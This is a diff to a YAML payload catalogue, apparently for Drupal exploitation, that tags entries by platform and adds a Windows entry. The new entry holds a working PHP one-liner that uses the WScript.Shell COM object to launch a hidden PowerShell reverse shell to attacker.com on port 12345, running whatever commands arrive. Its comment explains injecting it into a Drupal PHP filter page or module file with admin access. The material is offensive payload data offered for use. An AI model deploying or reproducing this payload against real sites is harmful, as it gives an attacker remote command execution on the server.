@@ -86,6 +86,7 @@ functions:
     contexts:
       unauthenticated:
     listener: tcp-server
+    platform: linux
     tty: false
     version: |-
       8.x < 8.5.1 / < 8.4.6 / < 8.3.9
@@ -99,6 +100,19 @@ functions:
     contexts:
       admin:
     listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      <?php $s=new COM('WScript.Shell');$s->exec('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(\"attacker.com\",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"'); ?>
+    comment: |
+      Windows variant: inject into a Drupal PHP filter page or module file. Uses
+      WScript.Shell COM object to launch a hidden PowerShell reverse shell.
+      Requires PHP's COM extension (enabled by default on Windows PHP builds).
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: windows
     tty: false
   webshell:
   - code: |
